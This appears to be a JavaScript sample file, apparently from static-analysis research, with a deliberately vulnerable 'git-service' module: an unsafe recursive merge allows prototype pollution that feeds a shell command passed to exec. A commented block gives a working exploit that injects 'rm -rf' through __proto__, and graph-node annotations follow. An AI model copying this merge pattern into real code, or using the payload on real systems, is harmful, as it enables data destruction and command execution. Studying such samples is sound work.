const escape = require('shell-escape');
const { exec } = require('child_process');

function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object'
        && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

module.exports = class Git {
  constructor(options) {
    this.options = options || {};
    this.defaults = { /* Sane defaults */ };
  }

  commit(message, gitConfig = {}) {
    let env = merge(this.defaults, gitConfig);
    let shell = this.options.shell || 'bash -c';
    let msg = escape(message);
    let cmd = `${shell} "git commit -m ${msg}"`;
    exec(cmd, { env }, (err, _out) => {
      if (err) { console.log(err); return -1; }
      return 0;
    });
  }
};

/* Benign use of the package
const Git = require('git-service');
let git = new Git();
let gitConfig = {
  GIT_CONFIG_PARAMETERS: 'commit.gpgsign=false'
};
git.commit('This commit is well behaved!', gitConfig);
*/

/* Command injection exploit
const Git = require('git-service');
let git = new Git();
let gitConfig = {
  ['__proto__']: { shell: 'rm -rf \; bash -c' }
};
git.commit('7h15 c0mm17 15 3V1L!', gitConfig);
*/

/*
l1  -> f_shell-escape
l2  -> f_child_process.exec
l3  -> f_merge
l4  -> o_Git
l5  -> str_"options"
l6  -> str_"defaults"
l7  -> f_Git.constructor
l8  -> f_Git.commit
l9  -> o_git
l10 -> o_git.options {} @ 19
l11 -> o_git.defaults[*] {} @ 20
l12 -> o_gitConfig[*]
l13 -> str_"keys"
l14 -> strs__gitConfig.keys
l15 -> str_message
l16 -> o_target[key] {} @ 8
l17 -> str_"shell"
l18 -> str_"bash -c"
l19 -> str__ret_shell-escape @ 26 (msg)
l20 -> cmd @ 27
l21 -> f__cb_1 @ 28-31
l22 -> o__ret_child_process.exec @ 28
l23 -> o__ret_child_process.exec.error
l24 -> o__ret_child_process.exec.stdout
l25 -> f_console.log
l26 -> n_-1
l27 -> n_0
*/

/*
l1 -> f_Git.commit
l2 -> message
l3 -> gitConfig
l4 -> f_merge
l5 -> git.defaults
l6 -> Object.keys(gitConfig)
l7 -> {} @ 8
*/
